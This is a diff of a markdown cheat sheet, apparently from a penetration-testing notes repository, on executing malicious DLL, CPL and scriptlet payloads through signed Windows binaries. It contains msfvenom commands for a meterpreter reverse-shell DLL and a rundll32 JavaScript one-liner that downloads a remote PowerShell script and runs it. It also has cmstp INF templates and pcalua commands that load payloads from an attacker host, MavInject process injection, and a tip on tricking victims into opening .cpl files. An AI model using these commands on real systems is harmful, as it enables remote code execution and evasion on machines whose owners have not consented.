@@ -12,38 +12,53 @@ tags:
 ---
 # DLL Execution
 
-## `rundll32.exe`
+## 01 - Generate Payloads
 
-Generate a DLL implant.
+### 1.1 - `msfvenom`
 
-```
-$ msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=<IP> lport=<PORT> -f dll -o implant.dll
-```
-
-Then execute it with `StartW` entry point.
+Generate a DLL payload then execute it with `StartW` entry point.
 
 ```
-C:\> rundll32.exe implant.dll,StartW
+$ msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=<IP> lport=<PORT> -f dll -o payload.dll
 ```
 
-To execute the **Control Panel Items** (`.cpl`) implant with entry point either `Control_RunDLL` or `Control_RunDLLAsuser`.
+### 1.2 - Empire
+
+TODO: Fill this info
 
 ```
-C:\> rundll32.exe shell32.dll,Control_RunDLL implant.cpl
-
-C:\> rundll32.exe shell32.dll,Control_RunDLLAsuser implant.cpl
+(Empire) > usestager windows/dll
 ```
 
-A custom implant can be compiled using the `.cpl` Windows features.
+## 02 - Execute Payload
+
+> [!TIP] CPL Payloads
+> You can actually social engineer the victim to double click the `.cpl` to establish connection.
+
+### `rundll32.exe`
 
 ```
-C:\> rundll32.exe implant.dll,Control_RunDLL
+C:\> rundll32.exe payload.dll,StartW
+```
+
+To execute the **Control Panel Items** (`.cpl`) payload with entry point either `Control_RunDLL` or `Control_RunDLLAsuser`.
+
+```
+C:\> rundll32.exe shell32.dll,Control_RunDLL payload.cpl
+
+C:\> rundll32.exe shell32.dll,Control_RunDLLAsuser payload.cpl
+```
+
+A custom payload can be compiled using the `.cpl` Windows features.
+
+```
+C:\> rundll32.exe payload.dll,Control_RunDLL
 ```
 
 Execute a JavaScript that runs a PowerShell script that is downloaded from a remote web site.
 
 ```
-C:\> rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();new%20ActiveXObject("WScript.Shell").Run("powershell -nop -exec bypass -c IEX (New-Object Net.WebClient).DownloadString('http[s]://<IP>[:PORT]/implant.ps1')");
+C:\> rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();new%20ActiveXObject("WScript.Shell").Run("powershell -nop -exec bypass -c IEX (New-Object Net.WebClient).DownloadString('http[s]://<IP>[:PORT]/payload.ps1')");
 ```
 
 Execute a JavaScript that runs `calc.exe` and then kills the `rundll32.exe` process that was started.
@@ -52,13 +67,13 @@ Execute a JavaScript that runs `calc.exe` and then kills the `rundll32.exe` proc
 C:\> rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();h=new%20ActiveXObject("WScript.Shell").Run("calc.exe", 0, true);try{h.Send();b=h.ResponseText;eval(b);}catch(e){new%20ActiveXObject("WScript.Shell").Run("cmd /c taskkill /f /im rundll32.exe",0,true);}
 ```
 
-Execute a scriptlet implant from a web server.
+Execute a scriptlet payload from a web server.
 
 ```
-C:\> rundll32.exe javascript:"..\mshtml,RunHTMLApplication ";document.write();GetObject("script:http[s]://<IP>[:PORT]/implant.sct")"
+C:\> rundll32.exe javascript:"..\mshtml,RunHTMLApplication ";document.write();GetObject("script:http[s]://<IP>[:PORT]/payload.sct")"
 ```
 
-## `regasm.exe`
+### `regasm.exe`
 
 ```
 C:\Windows\Microsoft.NET\Framework64\v4.0.30319\regasm.exe
@@ -76,43 +91,43 @@ Loads the target .DLL file and executes the UnRegisterClass function.
 C:\> regasm.exe /U AllTheThingsx64.dll
 ```
 
-## `regsvcs.exe`
+### `regsvcs.exe`
 
 ```
 C:\> regsvcs.exe AllTheThingsx64.dll
 ```
 
-## `regsvr32.exe`
+### `regsvr32.exe`
 
-Execute DLL implant.
-
-```
-C:\> regsvr32.exe /s implant.dll
-```
-
-## `msiexec.exe`
-
-Execute the DLL implant  (calls `DLLRegisterServer`).
+Execute DLL payload.
 
 ```
-C:\> msiexec.exe /y "C:\path\to\implant.dll"
+C:\> regsvr32.exe /s payload.dll
+```
+
+### `msiexec.exe`
+
+Execute the DLL payload  (calls `DLLRegisterServer`).
+
+```
+C:\> msiexec.exe /y "C:\path\to\payload.dll"
 ```
 
 Unregisters the target DLL.
 
 ```
-C:\> msiexec.exe /z "C:\path\to\implant.dll"
+C:\> msiexec.exe /z "C:\path\to\payload.dll"
 ```
 
-## `odbcconf.exe`
+### `odbcconf.exe`
 
 ```
-C:\> odbcconf.exe /a {regsvr.exe C:\path\to\implant.dll}
+C:\> odbcconf.exe /a {regsvr.exe C:\path\to\payload.dll}
 ```
 
-## `cmstp.exe`
+### `cmstp.exe`
 
-Fileless scriptlet implant template
+Fileless scriptlet payload template
 
 ```
 [version]
@@ -123,7 +138,7 @@ AdvancedINF=2.5
 UnRegisterOCXs=UnRegisterOCXSection
 
 [UnRegisterOCXSection]
-%11%\scrobj.dll,NI,http[s]://<IP>[:PORT]/implant.sct
+%11%\scrobj.dll,NI,http[s]://<IP>[:PORT]/payload.sct
 
 [Strings]
 AppAct = "SOFTWARE\Microsoft\Connection Manager"
@@ -131,7 +146,7 @@ ServiceName="Yay"
 ShortSvcName="Yay"
 ```
 
-DLL dropper implant template.
+DLL dropper payload template.
 
 ```
 [version]
@@ -142,8 +157,8 @@ AdvancedINF=2.5
 RegisterOCXs=RegisterOCXSection
 
 [RegisterOCXSection]
-C:\path\to\implant.dll
-\\<IP>\implant.dll
+C:\path\to\payload.dll
+\\<IP>\payload.dll
 
 [Strings]
 AppAct = "SOFTWARE\Microsoft\Connection Manager"
@@ -151,42 +166,42 @@ ServiceName="Pentestlab"
 ShortSvcName="Pentestlab"
 ```
 
-Execute implant.
+Execute payload.
 
 ```
-C:\> cmstp.exe /ni /s implant.inf
+C:\> cmstp.exe /ni /s payload.inf
 ```
 
-Execute fileless implant.
+Execute fileless payload.
 
 ```
-C:\> cmstp.exe /ni /s http[s]://<IP>[:PORT]/implant.inf
+C:\> cmstp.exe /ni /s http[s]://<IP>[:PORT]/payload.inf
 ```
 
-## `control.exe`
+### `control.exe`
 
 ```
-C:\> control.exe .\reflective_implant_loader.dll
+C:\> control.exe .\reflective_payload_loader.dll
 
-C:\> control.exe .\reflective_implant_loader.cpl
+C:\> control.exe .\reflective_payload_loader.cpl
 ```
 
-## `pcalua.exe`
+### `pcalua.exe`
 
 ```
-C:\> pcalua.exe -a .\implant.exe
+C:\> pcalua.exe -a .\payload.exe
 
-C:\> pcalua.exe -a \\<attacker_IP>\<share_name>\implant.dll
+C:\> pcalua.exe -a \\<attacker_IP>\<share_name>\payload.dll
 
-C:\> pcalua.exe -a .\implant.cpl
+C:\> pcalua.exe -a .\payload.cpl
 ```
 
-## `MavInject.exe`
+### `MavInject.exe`
 
-Inject DLL implant in a process ID.
+Inject DLL payload in a process ID.
 
 ```
-C:\> MavInject.exe <pid> /INJECTRUNNING C:\path\to\implant.dll
+C:\> MavInject.exe <pid> /INJECTRUNNING C:\path\to\payload.dll
 ```
 
 ---
